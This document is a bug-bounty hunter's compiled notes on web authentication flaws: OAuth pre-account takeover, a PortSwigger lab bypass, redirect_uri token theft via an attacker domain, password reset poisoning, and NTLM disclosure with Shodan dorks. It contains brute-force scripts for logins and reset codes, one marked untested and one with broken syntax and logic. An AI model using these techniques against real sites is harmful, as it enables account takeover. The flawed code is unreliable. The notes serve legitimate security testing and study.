
source: [OAuth Misconfiguration Pre-Account Takeover | by socalledhacker - Freedium](https://freedium.cfd/https://medium.com/h7w/oauth-misconfiguration-pre-account-takeover-535beb8d1987)


I discovered lots of OAuth misconfiguration pre-account takeover bug in past and this is only the bug I found the most, in almost every program that i hunt on which has login feature via Oauth, i got OAuth misconfiguration pre-account takeover because Oauth function is not easy to implement securely so developers always do mistake in configuration which is the cause of this bug and it is also complex to implement.



 how to find/test this bug, let's say you have a target which has login function via Oauth, now create an account using your email address and then a verification link will send to you email address, don't verify that.

Now logout to your account and create account using the same email address but this time use Oauth via google to create your account using same email address.

By doing that both the account normal signup and signup via google are linked to each and but also works independently, like you can access both via email and password and via sso.


**Description:-** OAuth is an authorization framework used to identify and authenticate users for an application. There are a number of implementation misconfigurations which can lead to an OAuth framework being implemented insecurely. These misconfigurations can lead to a broad range of issues which could allow an attacker to manipulate or retrieve sensitive data and potentially bypass the authentication process.

**Steps to reproduce:-**

1 — Go to [https://www.example.com](https://www.example.com/) 2 — Register on the target using victim@gmail.com using email registration 3 — A verification process will be done (don't verify it) 4 — Now, victim will use his Oauth account (victim@gmail.com) for registration, **he will be logged in** 5 — The attacker can now login into the victim's account using normal login (email and password) and the victim can use the same account using Oauth.
## P4 Bug?

## **Let’s Talk About Website Functionality — How It Works**

_When users create accounts using an email address, the system automatically extracts the first part of the email address to generate the username._

For example:

- **hello123@gmail.com** → Username: **hello123**
- **testuser@outlook.com** → Username: **testuser**

# The Bug 🐞: **_Steps to Reproduce_**

Imagine **User1** signs up using:  
✅ **Username:** Jinx9  
✅ **Email:** abcxyz@gmail.com

No problems here! But now, **User2** tries to sign up using OAuth with:  
❌ **Email:** Jinx9@gmail.com

_Boom! The system **blocks** the registration. Since the system pulls the username from the email, it tries to create **jinx9** again — but that’s already taken!

## Impact of the Bug

- **User Experience**: Users trying to sign up via OAuth may get blocked, even though their email is unique.
- **Accessibility**: Blocks legitimate users from creating accounts, potentially leading to lost sign-ups.

## Possible Solutions

1. **Unique Username Generation**: Append a random number or string to the username if a conflict is detected. _Example:_ **_“jinx9_123”_**
2. **Allow Users to Modify Usernames** — Let OAuth users edit their username before finalizing the registration
3. **Error Messaging**: Provide a clear error message suggesting alternative usernames if a conflict occurs.


![[Pasted image 20250618020903.png]]



Check reports of OAuth Misconfiguration Pre-Account Takeover

[https://hackerone.com/reports/1074047](https://hackerone.com/reports/1074047)

[https://hackerone.com/reports/1212374](https://hackerone.com/reports/1212374)


----

##  PortSwigger Lab: Authentication bypass via OAuth implicit flow


![[Pasted image 20241118192205.png]]


1. 1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.

2.  In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request `GET /auth?client_id=[...]`.
3. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a `POST` request containing this information to its own `/authenticate` endpoint, along with the access token.

After loggin-in we can see that in the POST request we see the user credentials:

in the below

![[Pasted image 20241118191633.png]]

1. Send the `POST /authenticate` request to Burp Repeater. In Repeater, change the email address to `carlos@carlos-montoya.net` and send the request. 

![[Pasted image 20241118191832.png]]

Observe that you do not encounter an error.


1. Right-click on the `POST` request and select "Request in browser" > "In original session". Copy this URL and visit it in the browser. You are logged in as Carlos and the lab is solved.


![[Pasted image 20241118192647.png]]

-> copy the request and open up in the browser.

![[Pasted image 20241118192743.png]]

_what happened?_

Since there is no **Client Authentication** the Access Token that we're using for peter weiner account was **applicable to carlos account aswell** which means we only need to know the victim email for a ATO


---

# Hacking your first OAuth on the Web application: Account takeover using Redirect and State parameter

source: https://medium.com/@security.tecno/hacking-your-first-oauth-on-the-web-application-account-takeover-using-redirect-and-state-5e857c7b1d43

**OAuth flows susceptible to Cross-Site Request Forgery (CSRF) attacks.**

### 1. OAuth account takeover via `Open redirection`

Account hijacking via the redirect_uri parameter in OAuth 2.0 is one of the most common security vulnerabilities where an attacker can steal a valid authorization code or access token to gain unauthorized access to a victim’s data. ~={orange}This attack leverages the misconfiguration or poor validation of the redirect_uri parameter, enabling the attacker to redirect users to malicious servers.=~

![](https://miro.medium.com/v2/resize:fit:627/1*0iEejuE1UwJF4fn-pNCejw.png)

## 1.1 How the Attack Works

In this attack, both the authorization code and the access token are targeted. By capturing these elements, an attacker **can impersonate the victim and access any application registered with the OAuth service.**

## 1.2 Attack Scenario

Consider a test website that allows users to log in with their social media accounts. Due to a misconfiguration by the OAuth provider, an attacker can steal authorization codes associated with other users’ accounts.

**① Initial Redirect:** When a user tries to access a secured application page without being logged in (e.g., [https://security.tecno.com),](https://security.tecno.com\),) the application redirects them to the login page.

**② Post-Login Redirect:** After successful login, the application redirects the user back to [https://security.tecno.com.](https://security.tecno.com.)

## 1.3 Exploitation of the Vulnerability

Sensitive data, like an access token, is often appended to the URL using the `redirect_uri` parameter. If the `redirect_uri` can be manipulated to redirect to an attacker’s server, the attacker can intercept this data.

① The attacker starts the OAuth flow and modifies the `redirect_uri` parameter to point to a server they control.

② After the user logs in and grants authorization, the OAuth server redirects the user to the malicious `redirect_uri`, such as `https://attackerdomain.com`.

③ The attacker’s server captures the authorization code or access token from the redirected URL.

④ The attacker completes the OAuth flow using the stolen authorization code or access token, gaining access to the victim’s account and data.

Sometimes the redirect URL accepts external URLs. If the **_redirect_uri_** accepts external URLs, attackers can use redirection to gain unauthorized access. For instance, using a redirector like: `https://accounts.google.com/signout/chrome/landing?continue=https://appengine.google.com/_ah/logout?continue%3Dhttp://attackerdomain.com` can allow the attacker to direct the flow to their server.

## 1.4 Common bypasses for OAuth redirect_uri

_common open redirect bypasses that are used in the wild to bypass the fixes. Here are some of the common bypasses:_

![](https://miro.medium.com/v2/resize:fit:627/1*A6gjTbqaPn92ZkoEqS5RfQ.png)

					Common redirect_uri bypasses

----


## Broken Authentication p4 bug

## **CWE-307: Improper Restriction of Excessive Authentication Attempts**

basically if you can send a lot login attempts without being rate limited and or restricted, allowing you to potentially brute force someone’s password, then you have identified an actual vulnerability! On the official CWE website, they claim that you can report this vulnerability to the associated bug bounty program and it should get accepted.

On top of that, you can find this vulnerability when making a submission on pretty much any bug bounty platform. For example, Intigriti lists this vulnerability under the **Broken Authentication** category.

![](https://miro.medium.com/v2/resize:fit:875/1*t0dPuhMwcp1lu969S2BDVg.png)

Overall, this is in fact a valid bug that you can report in case you have identified it. You can use Burp Suite or even make your own code that would send a lot of login attempts with different password each time (on your account) and if they all go through without any rate limitation or restrictions, then you have identified an actual vulnerability.

```
import requests
import time

# URL of the login endpoint
url = "https://www.example.com/login"

# List of passwords to try
passwords = ["password1", "password2", "password3", "password4", "password5"]

# Your username
username = "your_username"

# Loop through the list of passwords and attempt to login continuously
for password in passwords:
    while True:
        payload = {
            "username": username,
            "password": password
        }
        response = requests.post(url, data=payload)
        
        # Print the response status code and content
        print(f"Attempting password: {password}")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}\n")
        
        # Check for rate limiting (e.g., status code not 200 or 409)
        if response.status_code != 200 || response.status_code == 409:
            print("Rate limiting detected. Stopping the test.")
            break
        
        # Add a delay between requests to avoid overwhelming the server
        time.sleep(1)

print("Finished testing login attempts.")

```


## CWE-307: Improper Restriction of Excessive Authentication Attempts (Different scenario)



``` Javascript
const axios = require('axios');

// URL of the password reset verification endpoint
const url = 'https://www.example.com/verify-code';

// Your email or username
const email = 'your_email@example.com';

// Function to generate a 6-digit code
function generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Function to send a verification request
async function sendRequest(code) {
    try {
        const response = await axios.post(url, {
            email: email,
            code: code
        });
        console.log(`Attempting code: ${code}`);
        console.log(`Status Code: ${response.status}`);
        if (response.status === 200) {
            console.log('Correct code found:', code);
            return true;
        }
    } catch (error) {
        if (error.response && error.response.status === 401) {
            console.log(`Attempting code: ${code}`);
            console.log('Incorrect code.');
        } else {
            console.log('Error:', error.message);
        }
    }
    return false;
}

// Main function to brute force the verification code
async function bruteForce() {
    let found = false;
    while (!found) {
        const code = generateCode();
        found = await sendRequest(code);
    }
}

bruteForce();

```


This script uses the `axios` library to send POST requests to the verification endpoint with different 6-digit codes. It checks the response status code to determine if the code is correct. If the response status is 200, it means the correct code has been found.


**! NOT TESTED YET!**

## Other P4 bugs:
# 1. Security Questions with Easily Guessable Answers

- Scenario: A website uses security questions for password recovery, such as “What is your mother’s maiden name?” or “What is the name of the street you grew up on?” Such questions might be easy for an attacker to guess or find through social media or other public records.

# 2. Lack of Rate Limiting on Password Reset Requests

- Scenario: An attacker exploits a password reset function that does not limit the number of attempts. They continuously submit requests for password resets for a target’s email until they successfully guess the correct input, such as a birthday or a simple security question answer.

# 3. Predictable Password Reset Tokens

- Scenario: A system generates predictable reset tokens based on a formula that an attacker can reverse engineer (like using a simple timestamp). The attacker generates a valid token and uses it to reset the user’s password without needing access to the user’s email.

# 4. Password Reset Tokens Not Expiring

- Scenario: After initiating a password reset, a user receives a link that remains valid indefinitely. If this link is later discovered by an attacker (for instance, if the user’s email is compromised), it can still be used to reset the password.


hackerone report example:


`Here in this scenario, I've found that the there's a kind of server side invalidation of Password Reset tokens. Like if I've requested for password reset token (token1) and I don't use it, after I will make another request for password reset token (token2). This time I'll use the token2 means the link that I requested for the second time, so the first token (token1) should explicitly expire by the server. But here I can use the token1 also after password change by token2, this is unusual behavior of web application.`

`Exploit Scenario: If victim's email account is still logged into his/her Office Computers or any public Internet Cafe. Then any external attacker can use the unused token to reset victims token.`

`Proof of Concept:`

`1)Go to [https://infogram.com/forgot](https://infogram.com/forgot) and ask for password reset link. 2)Don't use the link keep it in Email inbox. 3)After some time repeat the step 1. 4)This time use the password reset link which was asked in step 3. means the 2nd link. 5)After changing the password, use the password reset link that was captured in step 1. 6)You'll see the password reset link is not expired even after password change. 7)I've also explained you the Exploit Scenario, now its all upto you.`

another one:

`EXPLANATION:`

`Suppose at 09:00 hrs I used password reset options of yelp and got a token on my email.Lets call it token_01. But i did not use it. And at 09:04 hrs I used again the password reset option and got a new token,which is token_02. Now generally after the issuance of token_02,the previous unused token should expire.But in case of yelp its not happening.Both the tokens are remaining usable at the same time.`

# 7. Exposing Password Reset Status

- Scenario: A website’s password reset page confirms whether an email address is registered: “If your email is in our database, you will receive a password reset link.” This behavior can be exploited by an attacker to harvest valid user emails for future attacks or spam.


----


# Password Reset Poisoning

# let’s start with a simple explanation of what a **Password Reset Poisoning** attack is.

When you forget your password and click “Forgot Password,” the website usually sends a password reset link to your email. This link is supposed to be safe and unique to you. But in a password reset poisoning attack, an attacker finds a way to modify or “poison” the reset link sent by the website. This can allow them to control parts of the reset process, potentially redirecting the link to themselves or manipulating it to their advantage.

_here's an example of origin header injection via password reset functionality, which lead to a redirect when clicking on the password reset link:_

So I noticed that the domain going to the host was **app.target.com**, but the reset link was coming from the domain **pay.target.com**. Since both domains were different, I considered two possibilities: either the server was taking the domain value for the reset link from the request, or it was configured on the server side.

![](https://miro.medium.com/v2/resize:fit:875/1*j74b-JHszvy-uflWDpMFmg.png)

Then I noticed that the domain going in the Origin header was **pay.target.com**.

![](https://miro.medium.com/v2/resize:fit:875/1*3OSY2Y0_qyg9jy-N6BeBtA.png)

# What is the Origin Header and How Does It Work?

The **Origin** header is an HTTP header that indicates the origin of the request, which includes the scheme (HTTP or HTTPS), hostname, and port number. It is primarily used for security purposes, particularly in Cross-Origin Resource Sharing (CORS) scenarios. The server **can use the Origin header to determine the source of the request and decide whether to allow or deny access based on that information.**

In this context, **I thought it was possible that the server might be using the value from the Origin header for generating the reset link instead of the host from the request.** This means that if I could manipulate the Origin header in my requests, I might be able to control the domain used in the reset link.

So, I changed the value of the Origin header from **pay.target.com** to the URL of my webhook site and then sent the request.

And this time, Cloudflare did not block the request, and the server accepted it as well.

![](https://miro.medium.com/v2/resize:fit:875/1*B4IQw_3pnDJ3bZOH-2G3NA.png)

However, the website displayed a client-side error saying that the reset email wasn’t sent and to try again.

![](https://miro.medium.com/v2/resize:fit:875/1*Oc-CkCPlwM9Ji0vHG2WzPQ.png)

	But when I checked my inbox, I found that I had received the reset link.

![](https://miro.medium.com/v2/resize:fit:875/1*ZgTq97SSn2-mBTsb9KtlBA.png)

![](https://miro.medium.com/v2/resize:fit:875/1*PSu-e1mQR6XnTp_iAcgA-w.png)

Then I clicked on the reset link. As soon as I clicked on it, instead of redirecting me to the website’s reset page, **It redirected me to the webhook site domain that I injected in the Origin header, along with the reset token.**

![](https://miro.medium.com/v2/resize:fit:875/1*v6qYtIPHqMwacwT-HpJgdw.png)

![](https://miro.medium.com/v2/resize:fit:875/1*ZhdAr4yQyjzqDhNkbTvYhA.png)

If an attacker obtains the reset token, they can use it to reset the password and take control of the victim’s account.


---

## NTLM Auth Disclosing Internal System Info via HTTP/2 to HTTP/1.1 Downgrade

#### Vulnerability Description

- _By downgrading the HTTP protocol from HTTP/2 to HTTP/1.1 at the endpoint [https://x.x.x.x](https://x.x.x.x/) and sending the default NTLM hash value of blank username and password results into encoded NTLM hash in the server response, which we can decode using any NTLM Challenge decoder that leads to internal system information disclosure._

## IP Verification

> https://www.shodan.io/host/x.x.x.x

- Check the domains associated with this IP using Shodan.
- Alternatively, just visit the IP via Chrome and it will display the associated domain in the "security certificate misconfiguration" error page.

_Associated domain/subdomain_: `abc.redacted.com`

#### Steps to Reproduce

- Visit the endpoint "[https://x.x.x.x](https://x.x.x.x/)"
- Proxy the request and send it to Burpsuite Repeater

![None](https://miro.medium.com/v2/resize:fit:700/1*q-H2O0xjZ5QG4l4w1K15aw.png)


- Observe it is automatically sent via HTTP/2 protocol version.
- Now downgrade from HTTP/2 to HTTP/1.1

![None](https://miro.medium.com/v2/resize:fit:700/1*-CdPsCMwAy5ax2HMfiR_yw.png)


- Add the following Authorization header and with the mentioned NTLM hash value which simply implies a blank username and password (this value will be the same for any endpoint we test)

```
Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
```

- By adding the above NTLM authorization with HTTP/1.1 we are checking if the server responds with the WWW-Authenticate: NTLM encoded value even with a blank username and password NTLM hash value

![None](https://miro.medium.com/v2/resize:fit:700/1*G4yh1krcruBK20Ke-Sq1dA.png)

- Now we have confirmed the vulnerability
- To decode this NTLM value, we use "NTLM Challenge Decoder" like below

https://github.com/nopfor/ntlm_challenger

![[Pasted image 20250119031041.png]]

- Download and install the script along with the required libraries: impacket and requests
- Now we run it with the vulnerable endpoint that we previously analyzed and identified.

![None](https://miro.medium.com/v2/resize:fit:700/1*XTaNBr64mLDGGaffyK2BEg.png)

Previously I didn't feel like reporting, but recently I saw people getting bounties, so thought let's try to report at least 1 and see the response. But the experience is horrible.

However, it's not good to look at things from only one side. If I were in the place of triager, I might have also done the same because this information is easily available via Direct Shodan Dorks as well. Let me show you how 😏

The decoded information that we got is the same like in below:

![None](https://miro.medium.com/v2/resize:fit:700/1*ZBMG-V6TLycS-RG-uzczow.png)

Only thing left is to keep reporting but there are chances of point deduction, and also bounty by some companies,~={orange} but only if they don't know that the information is easily available via Shodan =~that I have shown you previously.🤣

#### 🐞Shodan Dorks to directly get those internal information that others report and claim as:

```json
"HTTP NTLM Info:"
"HTTP NTLM Info:" "NetBIOS Domain Name"
"HTTP NTLM Info:" "Target Name"
"HTTP NTLM Info:" "DNS Domain Name:"
"HTTP NTLM Info:" "OS Build:"
```

📘To find such endpoints with 401 status code, use dorks like

```json
org:"...." http.status:401
hostname:*.domain.com http.status:401
ssl.cert.subject.cn:domain.com http.status:401
```

![None](https://miro.medium.com/v2/resize:fit:700/1*c9uYKGcLgqOdNsxGVr_dkw.png)

## references:

https://medium.com/swlh/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666

https://medium.com/@SOFTSWISS-Crypto/revealing-secrets-uncovering-vulnerabilities-with-ntlm-authentication-9e1038d4401f

---